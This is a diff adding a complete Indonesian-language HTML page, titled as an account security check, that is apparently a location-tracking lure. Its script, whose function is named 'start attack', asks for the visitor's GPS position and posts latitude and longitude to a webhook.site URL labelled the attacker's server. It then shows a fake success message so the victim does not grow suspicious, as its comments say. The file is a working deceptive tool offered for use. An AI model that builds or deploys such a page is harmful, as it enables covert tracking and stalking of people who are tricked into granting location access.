@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan Akun</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        #result { margin-top: 20px; display: none; text-align: left; font-size: 14px; padding: 10px; border-radius: 6px; background: #e8f5e9; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Secure Portal</h2>
+    <p>Verifikasi lokasi Anda untuk melanjutkan.</p>
+    <button onclick="mulaiSerangan()">Verifikasi & Lanjutkan</button>
+    <div id="result"></div>
+</div>
+
+<script>
+    // URL Webhook.site (Ganti ini dengan URL milikmu!)
+    const SERVER_PENYERANG = 'https://webhook.site/ganti-dengan-url-kamu';
+
+    function mulaiSerangan() {
+        const resultDiv = document.getElementById('result');
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = 'Meminta izin lokasi...';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    resultDiv.innerHTML = "Lokasi berhasil diverifikasi! (Tunggu...)";
+
+                    // ==========================================
+                    // EKSEKUSI FETCH DI SINI (Mengirim ke Webhook)
+                    // ==========================================
+                    fetch(SERVER_PENYERANG, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            aksi: "GPS_DITANGKAP",
+                            lat: lat,
+                            lon: lon,
+                            ip_address: "Akan diambil via backend"
+                        })
+                    }).then(() => {
+                        // Tampilkan pesan palsu ke korban agar tidak curiga
+                        resultDiv.innerHTML = "✅ Verifikasi Berhasil. Mengalihkan...";
+                    });
+                },
+                (error) => {
+                    resultDiv.innerHTML = "Izin lokasi ditolak. Verifikasi gagal.";
+                }
+            );
+        } else {
+            resultDiv.innerHTML = "Browser tidak mendukung.";
+        }
+    }
+</script>
+</body>
+</html>
